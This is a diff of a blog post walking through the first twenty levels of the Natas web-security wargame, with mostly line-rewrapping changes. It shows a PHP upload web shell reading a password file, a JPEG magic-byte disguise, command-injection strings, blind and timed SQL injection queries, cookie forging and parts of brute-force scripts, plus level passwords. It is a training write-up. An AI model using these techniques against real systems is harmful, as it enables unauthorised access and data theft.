@@ -22,13 +22,13 @@
     <section>
         
 
-<p>One of my objectives while I&rsquo;m at the
-<a href="{% post_url tech/2017-05-23-starting-at-recurse-center %}">Recurse Center</a>
-is to improve my knowedge of securing computer systems. A good way of learning
-this is to play an attacker and to try to break into insecure systems<sup class="footnote-ref" id="fnref:1"><a href="#fn:1">1</a></sup>. I&rsquo;ve
-been working through <a href="http://overthewire.org/wargames/natas/">Natas</a>, a
-&lsquo;wargame&rsquo; developed by <a href="http://overthewire.org/wargames/">Over The Wire</a>. Natas
-is a series of insecure webapps, which aim to teach the basics of web security.</p>
+<p>One of my objectives while I&rsquo;m at the <a href="{% post_url tech/2017-05-23-starting-at-recurse-center %}">Recurse
+Center</a> is to improve
+my knowedge of securing computer systems. A good way of learning this is to play
+an attacker and to try to break into insecure systems<sup class="footnote-ref" id="fnref:1"><a href="#fn:1">1</a></sup>. I&rsquo;ve been working
+through <a href="http://overthewire.org/wargames/natas/">Natas</a>, a &lsquo;wargame&rsquo; developed
+by <a href="http://overthewire.org/wargames/">Over The Wire</a>. Natas is a series of
+insecure webapps, which aim to teach the basics of web security.</p>
 
 <p>This post covers solutions to the first twenty levels of Natas. The security
 topics covered in these levels include:</p>
@@ -54,8 +54,8 @@ topics covered in these levels include:</p>
 
 <h2 id="2">2</h2>
 
-<p>Identical to level <a href="#1">1</a>, but right-click has been
-disabled. Use browser shortcuts to open the debugger.</p>
+<p>Identical to level <a href="#1">1</a>, but right-click has been disabled. Use browser
+shortcuts to open the debugger.</p>
 
 <p><code>ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi</code></p>
 
@@ -98,7 +98,7 @@ Referer header to our HTTP request:</p>
 <h2 id="6">6</h2>
 
 <p>Inspecting the site, we see that the following cookie has been set:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">loggedin<span style="color:#666">=</span><span style="color:#40a070">0</span>
+<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">loggedin <span style="color:#666">=</span> <span style="color:#40a070">0</span>;
 </code></pre></div>
 <p>Change this cookie to 1, and the password is returned.</p>
 
@@ -107,8 +107,8 @@ Referer header to our HTTP request:</p>
 <h2 id="7">7</h2>
 
 <p>In the source code, we see an included file <code>/includes/secret.inc</code>. Navigating
-to this page, we see that the secret is <code>FOEIUWGHFEEUHOFUOIU</code>.
-Enter this secret to get the password.</p>
+to this page, we see that the secret is <code>FOEIUWGHFEEUHOFUOIU</code>. Enter this secret
+to get the password.</p>
 
 <p><code>7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</code></p>
 
@@ -125,8 +125,8 @@ password.</p>
 <h2 id="9">9</h2>
 
 <p>Looking at the source code, we see that the secret, when encoded must match:
-<code>3d3d516343746d4d6d6c315669563362</code>. To find out the clear text secret,
-we can reverse the encoding steps:</p>
+<code>3d3d516343746d4d6d6c315669563362</code>. To find out the clear text secret, we can
+reverse the encoding steps:</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#007020">&lt;?php</span>
 <span style="color:#666">&gt;</span> hex2bin(<span style="color:#4070a0">&#34;3d3d516343746d4d6d6c315669563362&#34;</span>);
 <span style="color:#4070a0">&#34;==QcCtmMml1ViV3b&#34;</span>
@@ -154,8 +154,8 @@ comment any code that comes after with:</p>
 <h2 id="11">11</h2>
 
 <p>This level is the same as level <a href="#10">10</a>, but the characters <code>;</code>, <code>|</code> and <code>&amp;</code>
-are blocked by the server. We can utilise the <code>grep</code> to search for everything
-in the password file:</p>
+are blocked by the server. We can utilise the <code>grep</code> to search for everything in
+the password file:</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">.* /etc/natas_webpass/natas11 #</code></pre></div>
 <p><code>SUIRtXqbB3tWzTOgTAX2t8UfMbYKrgp6</code></p>
 
@@ -163,7 +163,7 @@ in the password file:</p>
 
 <p>In this level, we need to set a cookie, such that when it is base64 decoded and
 XOR decrypted with an unkown key, it returns the JSON string:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#062873;font-weight:bold">&#34;showpassword&#34;</span>:<span style="color:#4070a0">&#34;yes&#34;</span>,<span style="color:#062873;font-weight:bold">&#34;bgcolor&#34;</span>:<span style="color:#4070a0">&#34;#ffffff&#34;</span>}</code></pre></div>
+<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{ <span style="color:#062873;font-weight:bold">&#34;showpassword&#34;</span>: <span style="color:#4070a0">&#34;yes&#34;</span>, <span style="color:#062873;font-weight:bold">&#34;bgcolor&#34;</span>: <span style="color:#4070a0">&#34;#ffffff&#34;</span> }</code></pre></div>
 <p>To do this, we need to work out the XOR encryption key. Luckily, XOR encryption
 has the following property:</p>
 
@@ -175,7 +175,7 @@ encrypted_secret XOR secret = key
 we can work out the key.</p>
 
 <p>Looking through the server source code, we see that the default secret is:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#062873;font-weight:bold">&#34;showpassword&#34;</span>:<span style="color:#4070a0">&#34;no&#34;</span>,<span style="color:#062873;font-weight:bold">&#34;bgcolor&#34;</span>:<span style="color:#4070a0">&#34;#ffffff&#34;</span>}</code></pre></div>
+<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{ <span style="color:#062873;font-weight:bold">&#34;showpassword&#34;</span>: <span style="color:#4070a0">&#34;no&#34;</span>, <span style="color:#062873;font-weight:bold">&#34;bgcolor&#34;</span>: <span style="color:#4070a0">&#34;#ffffff&#34;</span> }</code></pre></div>
 <p>And by looking at the cookie returned, we can see that the encrypted secret is:</p>
 
 <pre><code>ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
@@ -217,7 +217,8 @@ our original JOSN string:</p>
 </code></pre></div>
 <p>This gives our desired cookie, <code>EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</code>. We set this
 by running the following JavaScript in the browser console:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#007020">document</span>.cookie <span style="color:#666">=</span> <span style="color:#4070a0">&#34;data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK&#34;</span>;
+<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#007020">document</span>.cookie <span style="color:#666">=</span>
+  <span style="color:#4070a0">&#34;data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK&#34;</span>;
 </code></pre></div>
 <p>Clicking on the <code>set color</code> button returns the password:</p>
 
@@ -245,9 +246,8 @@ to <code>file.php</code> uploading the file:</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#007020">&lt;?php</span>
 passthru(<span style="color:#4070a0">&#39;cat /etc/natas_webpass/natas13&#39;</span>);
 </code></pre></div>
-<p>Submitting the form
-displays a link to the file. When we click on the link, the PHP code is executed
-and the password is displayed.</p>
+<p>Submitting the form displays a link to the file. When we click on the link, the
+PHP code is executed and the password is displayed.</p>
 
 <blockquote>
 <p>jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</p>
@@ -261,10 +261,10 @@ an image.</p>
 
 <p><code>exif_imagetype</code> works by reading the first few bytes from a file to check if
 they match what the first few bytes of a <code>jpeg</code>, <code>gif</code>, <code>png</code> etc file are meant
-to be. We can therefore trick the function by supplying a file which starts
-with the first few bytes of an image format. For example, <code>jpeg</code> files start
-with the number <code>0xFFD8FFE0</code>. We can create a <code>php</code> script with the correct
-starting bytes with the following <code>python</code> code:</p>
+to be. We can therefore trick the function by supplying a file which starts with
+the first few bytes of an image format. For example, <code>jpeg</code> files start with the
+number <code>0xFFD8FFE0</code>. We can create a <code>php</code> script with the correct starting
+bytes with the following <code>python</code> code:</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#007020;font-weight:bold">with</span> <span style="color:#007020">open</span>(<span style="color:#4070a0">&#34;script.php&#34;</span>, <span style="color:#4070a0">&#34;w&#34;</span>) <span style="color:#007020;font-weight:bold">as</span> f:
     f<span style="color:#666">.</span>write(<span style="color:#4070a0">&#39;</span><span style="color:#4070a0;font-weight:bold">\xFF\xD8\xFF\xE0</span><span style="color:#4070a0">&#39;</span>)
     f<span style="color:#666">.</span>write(<span style="color:#4070a0">&#34;&#34;&#34;&lt;?php
@@ -288,9 +288,9 @@ against a MySQL database:</p>
     <span style="color:#666">.</span><span style="color:#bb60d5">$_REQUEST</span>[<span style="color:#4070a0">&#34;password&#34;</span>]<span style="color:#666">.</span><span style="color:#4070a0">&#34;</span><span style="color:#4070a0;font-weight:bold">\&#34;</span><span style="color:#4070a0">&#34;</span>;
 </code></pre></div>
 <p>We can see that the <code>username</code> and <code>password</code> sections of the query string
-aren&rsquo;t sanitised. If a request is made that returns &gt; 0 rows, the password
-is printed. Supplying the <code>debug</code> keyword in the query string prints out the
-query which is to be executed, making it easier to debug.</p>
+aren&rsquo;t sanitised. If a request is made that returns &gt; 0 rows, the password is
+printed. Supplying the <code>debug</code> keyword in the query string prints out the query
+which is to be executed, making it easier to debug.</p>
 
 <p>Looking at the query, need to construct a statement which reutrns a row.</p>
 
@@ -310,20 +310,20 @@ query which is to be executed, making it easier to debug.</p>
 <h2 id="16">16</h2>
 
 <p>Level 16 also features a SQL injection attack. This time, we are presented with
-a simple web app which tells the user whether a sumbitted username exists in
-a database. From the source, we see that the database also contains the
-user&rsquo;s password.</p>
+a simple web app which tells the user whether a sumbitted username exists in a
+database. From the source, we see that the database also contains the user&rsquo;s
+password.</p>
 
 <p>We can construct a SQL query which leaks information about the user&rsquo;s password.
 The following query makes use of the MySQL <code>LIKE</code> function, which pattern
 matches a field.</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#007020;font-weight:bold">SELECT</span> <span style="color:#666">*</span> <span style="color:#007020;font-weight:bold">from</span> users <span style="color:#007020;font-weight:bold">where</span> username<span style="color:#666">=</span><span style="color:#4070a0">&#34;natas16&#34;</span> <span style="color:#007020;font-weight:bold">AND</span> password <span style="color:#007020;font-weight:bold">LIKE</span> <span style="color:#007020">BINARY</span> <span style="color:#4070a0">&#34;a%&#34;</span></code></pre></div>
 <p>The query tests whether there is a user named <code>natas16</code>, with a password that
-starts with the letter <code>a</code>. If there is, the webpage says &ldquo;This user exists&rdquo;.
-If there isn&rsquo;t the webpage says &ldquo;This user doesn&rsquo;t exist&rdquo;. The web app leaks
-some information about the password. We can then repeat this query checking for
-the letters <code>b, c, ...</code>, until we find a match. We can then repeat the process
-for the second characted, and repeat that until we have the full password.</p>
+starts with the letter <code>a</code>. If there is, the webpage says &ldquo;This user exists&rdquo;. If
+there isn&rsquo;t the webpage says &ldquo;This user doesn&rsquo;t exist&rdquo;. The web app leaks some
+information about the password. We can then repeat this query checking for the
+letters <code>b, c, ...</code>, until we find a match. We can then repeat the process for
+the second characted, and repeat that until we have the full password.</p>
 
 <p>The following code does this:</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#60a0b0;font-style:italic"># -*- coding: utf-8 -*-</span>
@@ -407,16 +407,16 @@ logging<span style="color:#666">.</span>getLogger(<span style="color:#4070a0">&#
 
 <p>This level is similar to the previous one. The web app is the same as the one
 from levels <a href="#10">10</a> and <a href="#11">11</a>, but it returns an error if any of the
-characters <code>;</code>, <code>|</code>, <code>&amp;</code>, <code>`</code>, <code>\</code>, <code>'</code>, and <code>&quot;</code>.
-are used. We can, however, make use of shell varible expansions:</p>
+characters <code>;</code>, <code>|</code>, <code>&amp;</code>, <code>`</code>, <code>\</code>, <code>'</code>, and <code>&quot;</code>. are used. We can, however,
+make use of shell varible expansions:</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">grep -i <span style="color:#4070a0">&#34;</span><span style="color:#007020;font-weight:bold">$(</span>grep -E ^a.* /etc/natas_webpass/natas17<span style="color:#007020;font-weight:bold">)</span><span style="color:#4070a0">aprils&#34;</span> dictionary.txt</code></pre></div>
-<p>If the password doesn&rsquo;t start with the letter &lsquo;a&rsquo;, the grep inside the
-variable expansion returns nothing, and the outer grep searches for &lsquo;aprils&rsquo;,
-which it finds in dictionary.txt. If however, the password does start with &lsquo;a&rsquo;,
-the grep will return the password, and the outer grep will search for
-<code>axxxaprils</code> (where <code>xxx</code> represents the rest of the characters in the password)
-, which it won&rsquo;t find, so will return nothing. We can repeat
-this process for all letters as before.</p>
+<p>If the password doesn&rsquo;t start with the letter &lsquo;a&rsquo;, the grep inside the variable
+expansion returns nothing, and the outer grep searches for &lsquo;aprils&rsquo;, which it
+finds in dictionary.txt. If however, the password does start with &lsquo;a&rsquo;, the grep
+will return the password, and the outer grep will search for <code>axxxaprils</code> (where
+<code>xxx</code> represents the rest of the characters in the password) , which it won&rsquo;t
+find, so will return nothing. We can repeat this process for all letters as
+before.</p>
 
 <p>The code to do this is very similar to the code from level <a href="#16">16</a>:</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#60a0b0;font-style:italic"># -*- coding: utf-8 -*-</span>
@@ -502,9 +502,9 @@ logging<span style="color:#666">.</span>getLogger(<span style="color:#4070a0">&#
 query returns data or not. We can solve this with a timed blind SQL injection.</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#007020;font-weight:bold">SELECT</span> <span style="color:#666">*</span> <span style="color:#007020;font-weight:bold">from</span> USERS <span style="color:#007020;font-weight:bold">where</span> username<span style="color:#666">=</span><span style="color:#4070a0">&#34;natas18&#34;</span>
 <span style="color:#007020;font-weight:bold">AND</span> <span style="color:#007020;font-weight:bold">IF</span>(password <span style="color:#007020;font-weight:bold">LIKE</span> <span style="color:#007020">BINARY</span> <span style="color:#4070a0">&#34;a%&#34;</span>, SLEEP(<span style="color:#40a070">2</span>), <span style="color:#40a070">0</span>)</code></pre></div>
-<p>This query checks if user <code>natas18</code>&rsquo;s password starts with the letter &lsquo;a&rsquo;. If
-it does, then sleep for two seconds, else do nothing. By timing the requests,
-we can tell if we have a match.</p>
+<p>This query checks if user <code>natas18</code>&rsquo;s password starts with the letter &lsquo;a&rsquo;. If it
+does, then sleep for two seconds, else do nothing. By timing the requests, we
+can tell if we have a match.</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#60a0b0;font-style:italic"># -*- coding: utf-8 -*-</span>
 
 <span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">logging</span>
@@ -575,13 +575,13 @@ logging<span style="color:#666">.</span>getLogger(<span style="color:#4070a0">&#
 
 <h2 id="19">19</h2>
 
-<p>In this level, we must supply admin credentials to be shown the password
-for the next level. Looking through the source code, we see that we can bypass
-supplying admin credentials if we can trick the server into thinking we have
-already logged in by setting the <code>PHPSESSID</code> cookie to the session id of an
-admin account. We don&rsquo;t know the admin session number, but we can brute force
-it by trying out session numbers. A comment in the code says that there are
-only a 640 possible sessions.</p>
+<p>In this level, we must supply admin credentials to be shown the password for the
+next level. Looking through the source code, we see that we can bypass supplying
+admin credentials if we can trick the server into thinking we have already
+logged in by setting the <code>PHPSESSID</code> cookie to the session id of an admin
+account. We don&rsquo;t know the admin session number, but we can brute force it by
+trying out session numbers. A comment in the code says that there are only a 640
+possible sessions.</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#60a0b0;font-style:italic"># -*- coding: utf-8 -*-</span>
 
 <span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">logging</span>
